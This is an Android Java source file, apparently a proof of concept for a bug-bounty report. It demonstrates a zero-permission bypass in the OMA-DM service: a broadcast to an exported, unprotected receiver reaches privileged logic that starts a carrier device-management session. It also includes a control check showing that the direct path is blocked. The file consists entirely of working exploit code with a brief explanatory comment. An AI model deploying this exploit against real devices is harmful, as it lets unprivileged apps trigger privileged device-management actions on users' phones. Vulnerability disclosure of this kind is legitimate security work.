package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

/**
 * Zero-permission PoC for com.android.omadm.service.
 *
 * DMIntentReceiver is manifest-protected by the signature|privileged permission
 * com.android.permission.WRITE_OMADM_SETTINGS. But TelephonyBroadcastReceiver (same
 * package, exported, NO permission) directly instantiates DMIntentReceiver and calls
 * its onReceive() as a plain Java method for the unprotected
 * com.google.android.carrier.action.APP_ENABLED action -- this completely bypasses the
 * OS-level broadcast permission check (which only applies to the sendBroadcast() IPC
 * path, not a direct in-process method call), letting a zero-perm app reach
 * DMIntentReceiver's normally-privileged-only logic (here: the
 * TRIGGER_CARRIER_PROVISIONING / handleSettingTriggeredUpdateIntent() path, which starts
 * a real OMA-DM device-management session for the given subId).
 */
public class OmadmBypassActivity extends Activity {
    private static final String TAG = "VRP-OmadmBypass";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        int subId = getIntent().getIntExtra("subId", 1);

        try {
            Intent i = new Intent("com.google.android.carrier.action.APP_ENABLED");
            i.setComponent(new ComponentName(
                    "com.android.omadm.service",
                    "com.android.omadm.service.TelephonyBroadcastReceiver"));
            i.putExtra("android.telephony.extra.SUBSCRIPTION_INDEX", subId);
            sendBroadcast(i);
            Log.i(TAG, "sendBroadcast() to TelephonyBroadcastReceiver returned normally (no SecurityException) subId=" + subId);
        } catch (SecurityException e) {
            Log.e(TAG, "BLOCKED by SecurityException: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "other exception: " + e);
        }

        // Control: confirm the same action->DMIntentReceiver path IS blocked when sent
        // directly to DMIntentReceiver itself (the properly permission-gated component).
        try {
            Intent i2 = new Intent("com.google.android.carrier.action.APP_ENABLED");
            i2.setComponent(new ComponentName(
                    "com.android.omadm.service",
                    "com.android.omadm.service.DMIntentReceiver"));
            i2.putExtra("android.telephony.extra.SUBSCRIPTION_INDEX", subId);
            sendBroadcast(i2);
            Log.i(TAG, "sendBroadcast() DIRECTLY to DMIntentReceiver returned normally (UNEXPECTED)");
        } catch (SecurityException e) {
            Log.e(TAG, "DIRECT send to DMIntentReceiver correctly BLOCKED: " + e.getMessage());
        }

        finish();
    }
}
